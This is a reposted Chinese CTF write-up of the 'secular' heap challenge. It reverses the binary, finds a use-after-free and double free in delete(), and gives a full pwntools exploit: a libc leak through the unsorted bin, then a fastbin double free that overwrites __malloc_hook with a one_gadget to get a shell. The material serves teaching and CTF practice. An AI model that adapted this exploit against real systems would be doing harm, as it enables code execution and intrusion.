> 原文链接: https://www.anquanke.com//post/id/172094 


# CTF萌新学做强网杯线下题secular


                                阅读量   
                                **174231**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t0123c59557e26a0c7c.jpg)](https://p0.ssl.qhimg.com/t0123c59557e26a0c7c.jpg)



## 1、逆向分析

​ 利用checksec查看程序，保护全部开启。

```
Canary                        : Yes
NX                            : Yes
PIE                           : Yes
Fortify                       : Yes
RelRO                         : Full
```

​ 运行secular，是一个典型的菜单程序，分为以下5个操作。

```
☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ 
☆ ☆     Easy Game  ☆ ☆ 
☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ 
1:Add
2:Show
3:Delete
4:Magic
5:Exit
Your Choice :
```

​ Add选项会创建一个结构体，如下所示：

```
struct st`{`
int flag;
int LuckyNumber;
char *Name;//Name通过malloc(size)分配，size大小由用户自己输入
`}`
```

​ IDA pro分析相应的操作函数。

```
unsigned __int64 add()
`{`
  struc_st *v0; // rbp
  unsigned int Namelen; // er13
  void *Name_ptr; // rbx
  __int64 v3; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v5; // rt1
  unsigned __int64 v6; // [rsp+8h] [rbp-30h]

  v6 = __readfsqword(0x28u);
  if ( unk_202040 &gt; 12 )
    goto LABEL_13;
  v0 = (struc_st *)malloc(0x10uLL); //申请0x10大小的堆空间，保存st结构体数据
  puts("Input Length of Name:");
  Namelen = read_str();
  Name_ptr = malloc((signed int)Namelen);//申请Namelen大小的堆空间，保存Name字符串
  __printf_chk(1LL, (__int64)"This is a gift for you %xn");
  if ( !Name_ptr )
    goto LABEL_7;
  __printf_chk(1LL, (__int64)"Input Your Name:");
  read(0, Name_ptr, Namelen);
  v0-&gt;Name = (__int64)Name_ptr;
  v0-&gt;flag = 1;
  __printf_chk(1LL, (__int64)"Input Your Luckynumber:");
  v0-&gt;LuckyNumber = read_str();
  v3 = 0LL;
  while ( qword_202060[v3] )
  `{`
    if ( ++v3 == 10 )
    `{`
      puts("You Must Did Something Undescribe!");
LABEL_7:
      exit(-1);
    `}`
  `}`
  ++unk_202040;
  qword_202060[(signed int)v3] = v0;//全局数组保存Add操作的st结构体指针
  v5 = __readfsqword(0x28u);
  result = v5 ^ v6;
  if ( v5 != v6 )
  `{`
LABEL_13:
    puts("You Are Too Stupid");
    exit(-1);
  `}`
  return result;
`}`
```

```
unsigned __int64 delete()
`{`
  signed int v0; // eax
  __int64 v1; // rbp
  unsigned __int64 v3; // [rsp+8h] [rbp-20h]

  v3 = __readfsqword(0x28u);
  __printf_chk(1LL, (__int64)"Input Index:");
  v0 = read_str();
  if ( v0 &gt; 9 )//index不能超过9，即申请的st结构体不能超过9个
  `{`
    puts("Invalid Index");
    exit(-1);
  `}`
  v1 = v0;
  free(*(void **)(qword_202060[v0] + 8LL));//释放st-&gt;name空间
  *(_DWORD *)qword_202060[v1] = 0;//flag=0
  return __readfsqword(0x28u) ^ v3;
`}`
```

​ 在delete()函数中，free前只检查了**index**的合法性，并且没有在free后对指针进行置空，所以存在use after free，也可以double free。

```
unsigned __int64 magic()
`{`
  int magic_num; // eax
  __int64 v1; // rdx
  __int64 v2; // rcx
  signed int v3; // er12
  __int64 v4; // rbx
  _DWORD *v5; // rdi
  unsigned __int64 v7; // [rsp+8h] [rbp-20h]

  v7 = __readfsqword(0x28u);
  puts("Input Your Magic Number:");
  magic_num = read_str();
  v1 = 0LL;
  while ( 1 )
  `{`
    v2 = qword_202060[v1];
    v3 = v1;
    if ( v2 )
    `{`
      if ( *(_DWORD *)(v2 + 4) == magic_num )
        break;
    `}`
    if ( ++v1 == 10 )
    `{`
      v3 = 10;
      break;
    `}`
  `}`
  v4 = 0LL;
  do
  `{`
    while ( 1 )
    `{`
      v5 = (_DWORD *)qword_202060[v4];
      if ( !*v5 )
        break;
      if ( v3 &lt; (signed int)++v4 )
        return __readfsqword(0x28u) ^ v7;
    `}`
    free(v5);
    qword_202060[v4++] = 0LL;
  `}`
  while ( v3 &gt;= (signed int)v4 );
  return __readfsqword(0x28u) ^ v7;
`}`
```

​ magic()函数通过输入的magic number也就是st结构体的LuckyNumber来free掉相应的st结构体，并将全局数组qword_202060[]保存的指针置空。



## 2、漏洞利用

​ 因为PIE开启，首先得利用Unsotred bin泄露出Unsorted(av)，其跟libc基址的偏移是固定的，可以通过调试即libc的地址，从而得到libc的基址，继而可以根据给出的lib.so.6文件中**__malloc_hook**的偏移计算出其在内存中的虚拟地址；由于RelRO保护为Full因此got表无法改写，而利用double free可以实现[Fastbin attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack/)，将0x70大小chunk申请至**__malloc_hook**附近，从而将**__malloc_hook**的内容改为one_gadget地址，最终程序调用malloc函数时会通过**__malloc_hook**劫持程序流程执行one_gadget。

### <a class="reference-link" name="2.1%20%E5%88%A9%E7%94%A8Unsorted%20bin%E6%B3%84%E9%9C%B2libc%E7%9A%84%E5%9C%B0%E5%9D%80"></a>2.1 利用Unsorted bin泄露libc的地址

​ 首先通过add操作申请3个0x100、0x10、0x10的堆空间（对应的chunk大小为0x110、0x20、0x20），释放第0、2号，此时2号对应的chunk进入fastbin，0号对应的chunk根据glic堆的管理机制进入Unsorted bin，由于Unsorted bin是一个双向链表，此时链表中只有一个0x110大小的Unsorted bin，其fd和bk指针会指向Unsorted bin的链表头，该链表头与libc基址的偏移是固定的，进而在gdb中调试中计算此地址到libc基址的0x3c4b78。此时再申请0x100大小的堆空间，就会分配刚刚释放的0号chunk，此时打印add的内容就会泄露出bk指针保存的链表头地址，再减去偏移就得到libc的基址。

[![](https://p3.ssl.qhimg.com/t01cdacb33944bb3da2.png)](https://p3.ssl.qhimg.com/t01cdacb33944bb3da2.png)

有关Glibc堆的数据结构请参考[堆的数据结构](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure/)。

```
#use unsortbin to leak libc address
add(0x100, "0"*0x8, "0")
add(0x10, "1"*0x8, "1")
add(0x10, "2"*0x8, "2")
dele(0)
dele(2)
#gdb.attach(p)
add(0x100, "12345678", "3")//fd指针被覆盖为8字节数据，bk还是保存的链表头，如上图所示。
show(3)
p.recvuntil("12345678")
#0x7f4f10f4cb78-0x7f4f10b88000=0x3c4B78
offset = 0x3c4b78
log.success("offset:"+hex(offset))
libc_base = u64(p.recvuntil("n")[ :-1].ljust(8, "x00")) - offset
log.success("libc_base:"+hex(libc_base))
```

### <a class="reference-link" name="2.2%20%E5%88%A9%E7%94%A8Double%20free&amp;Fastbin%20attack%E6%94%B9%E5%86%99__malloc_hook"></a>2.2 利用Double free&amp;Fastbin attack改写__malloc_hook

​ 上一步通过泄露得到libc基址，从而就可以计算出**__malloc_hook**的虚拟地址。我们通过Fastbin attack，申请一个0x70大小的chunk到**__malloc_hook**附近，这个附近到底是多少呢？

​ 由于fastbin在malloc过程中，为了满足fastbin_index检查，我们通过gdb调试找到**__malloc_hook**-0x23处正好有一个**size=0x7f**的位置，如下图所示。

[![](https://p2.ssl.qhimg.com/t01ed35a8c5179d345f.png)](https://p2.ssl.qhimg.com/t01ed35a8c5179d345f.png)

```
#double free to change __malloc_hook
one_gadget = 0xf02a4
log.success("one_gadget:"+hex(libc_base+one_gadget))
malloc_hook = libc_base + libc.symbols["__malloc_hook"]
log.success("__malloc_hook:"+hex(malloc_hook))
#use fastbin double free to change __malloc_hook
add(0x60, "a"*0x8, "4")
add(0x60, "b"*0x8, "5")
dele(4)
dele(5)
dele(4)
#malloc_hook-0x13, fake fastbin size 0x7f to pass fastbin_index check
add(0x60, p64(malloc_hook-0x13-0x10), "6") 
add(0x60, "e"*0x8, "7")
add(0x60, "f"*0x8, "8")
add(0x60, "a"*0x13+p64(libc_base+one_gadget), "9")
```

​ 此时申请的9号chunk位于**__malloc_hook**-0x13-0x10的位置，gdb调试查看，发现**__malloc_hook**被改写为one_gadget，如下图所示。

[![](https://p5.ssl.qhimg.com/t01d4fa3dd0651bdf02.png)](https://p5.ssl.qhimg.com/t01d4fa3dd0651bdf02.png)

​ 其中one_gadget可以通过工具从lib.so.6（我的版本libc-2.23.so）中帮我们获取（[one_gadget](https://github.com/david942j/one_gadget)工具），加上泄露的libc基址即one_gadget在内存中的虚拟地址。

[![](https://p0.ssl.qhimg.com/t01f6cd722d72639b19.png)](https://p0.ssl.qhimg.com/t01f6cd722d72639b19.png)

​ 经测试，0xf02a4处的one_gadget可以执行成功。

### <a class="reference-link" name="2.3%20%E5%88%A9%E7%94%A8__malloc_hook%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"></a>2.3 利用__malloc_hook劫持程序流程

​ 直接调用malloc无法触发**__malloc_hook**，因为one_gadgets的条件限制不满足，执行均不会成功，此时我们再一次利用double free触发**malloc_printerr**，在错误处理过程中会调用malloc触发**__malloc_hook**从而执行one_gadget得到shell，如下图所示。

```
dele(6)
dele(6)
p.interactive()
```

[![](https://p3.ssl.qhimg.com/t011c73f325d5f3cb45.png)](https://p3.ssl.qhimg.com/t011c73f325d5f3cb45.png)

### <a class="reference-link" name="2.4%20Exploit%20Script"></a>2.4 Exploit Script

```
#!/usr/bin/env python2
#coding=utf-8
from pwn import *
import time
local = 1
debug = 1
file = "./secular"
libcPath = ""
if local:
    p = process(file, env=`{`"LD_PRELOAD": libcPath`}`)
    elf = ELF(file)
    libc = elf.libc
else:
    p = remote("ip", port=1234)
if debug:
    context.log_level = "debug"

def add(nameLen, name, luckyNum):
    p.sendlineafter("Choice :", "1")
    p.sendlineafter("Name:", str(nameLen))
    p.sendafter("Name:", name)
    p.sendlineafter("Luckynumber:", luckyNum)

def show(index):
    p.sendlineafter("Choice :", "2")
    p.sendlineafter("Index:", str(index))

def dele(index):
    p.sendlineafter("Choice :", "3")
    p.sendlineafter("Index:", str(index))

def magic(number):
    p.sendlineafter("Choice :", "4")
    p.sendlineafter("Number:", str(number))


#use unsortbin to leak libc address
add(0x100, "0"*0x8, "0")
add(0x10, "1"*0x8, "1")
add(0x10, "2"*0x8, "2")
dele(0)
dele(2)
#gdb.attach(p)
add(0x100, "12345678", "3")
show(3)
p.recvuntil("12345678")
#0x7f4f10f4cb78-0x7f4f10b88000=0x3c4B78
offset = 0x3c4b78
log.success("offset:"+hex(offset))
libc_base = u64(p.recvuntil("n")[ :-1].ljust(8, "x00")) - offset
log.success("libc_base:"+hex(libc_base))

#double free to change __malloc_hook
one_gadget = 0xf02a4
log.success("one_gadget:"+hex(libc_base+one_gadget))
malloc_hook = libc_base + libc.symbols["__malloc_hook"]
log.success("__malloc_hook:"+hex(malloc_hook))
#use fastbin double free to change __malloc_hook
add(0x60, "a"*0x8, "4")
add(0x60, "b"*0x8, "5")
dele(4)
dele(5)
dele(4)
#malloc_hook-0x13, fake fastbin size 0x7f to pass fastbin_index check
add(0x60, p64(malloc_hook-0x13-0x10), "6") 
add(0x60, "e"*0x8, "7")
add(0x60, "f"*0x8, "8")
add(0x60, "a"*0x13+p64(libc_base+one_gadget), "9")
# directly malloc doesn't work
# double free triggers error and it will call malloc 
dele(6)
dele(6)
p.interactive()
```



## 3、思考

​ 该题是一道典型的Double Free&amp;Fastbin Attack，由于保护全开，常规的改写got表在这里并不适用。可以说通过这一道题可以学到CTF很多知识。这道题不难，但考查的知识点却很多，有Double Free漏洞原理、chunk数据结构、Fast bin、Unsorted bin、hook机制等等，新手要做这一道题首先必须深入掌握Glibc heap的管理机制，只有扎实掌握了基本知识点并能熟练运用，以后再碰到这种组合拳类型的题就能迎刃而解了。

​ 当我们学习得更多的时候，会发现这道题还有几种其他的解法，欢迎大家实践讨论。例如：
- 利用__free_hook劫持程序流程。
- 利用Fastbin attack修改**_IO_2_1_stdout** 的vtable指针指向one_gadget。也可以直接伪造一个填充one_gadget的chunk，将**_IO_jump_t**的地址更改为伪造的chunk地址。
- 利用Fastbin attack攻击栈，将malloc申请的堆迁移到栈中，利用ROP来getshell。
作为一个CTF PWN萌新，以上内容肯定有不对的地方，恳请大家批评指正。
